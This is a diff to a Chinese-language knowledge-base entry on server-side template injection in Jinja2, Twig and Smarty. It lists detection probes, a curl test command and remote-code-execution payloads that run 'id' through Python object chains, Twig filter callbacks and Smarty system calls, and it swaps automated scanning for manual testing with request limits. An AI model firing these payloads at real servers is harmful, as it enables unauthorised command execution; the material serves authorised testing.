@@ -2,9 +2,9 @@
   "id": "kb004",
   "title": "SSTI 模板注入",
   "description": "Jinja2/Twig/Smarty 检测三元组与利用",
-  "detail": "检测：{7*7} → 49 (Jinja2/Twig?)，{{7*'7'}} → 7777777 (Jinja2)，49 (Twig)。\nJinja2: {{config}} 看配置；RCE:\n{{''.__class__.__mro__[1].__subclasses__()}} 找 os._wrap_close / Popen\n或 lipsum.__globals__['os'].popen('id').read()\nTwig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\nSmarty: {system('id')} / {if system('id')}{/if}\ntplmap -u 可自动化。Python 沙箱逃逸查 attr/globals 链。",
+  "detail": "检测：{{7*7}} → 49（Jinja2/Twig 已知答案），{{7*'7'}} → 7777777（Jinja2），49（Twig）。先用普通字符串作对照，一次只改一个表达式；仅可复现的 Body 差分支持继续验证。\nJinja2: {{config}} 看配置；RCE:\n{{''.__class__.__mro__[1].__subclasses__()}} 找 os._wrap_close / Popen\n或 lipsum.__globals__['os'].popen('id').read()\nTwig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\nSmarty: {system('id')} / {if system('id')}{/if}\n不默认调用自动扫描器；手工差分须记录已知答案、负对照与请求上限，未复现或达到上限即关闭当前 payload 分支。Python 沙箱逃逸查 attr/globals 链。",
   "commands": [
-    "tplmap -u 'http://T/?name='"
+    "curl -sS --max-time 15 -G --data-urlencode 'name={{7*7}}' 'http://T/'"
   ],
   "tags": [
     "web",
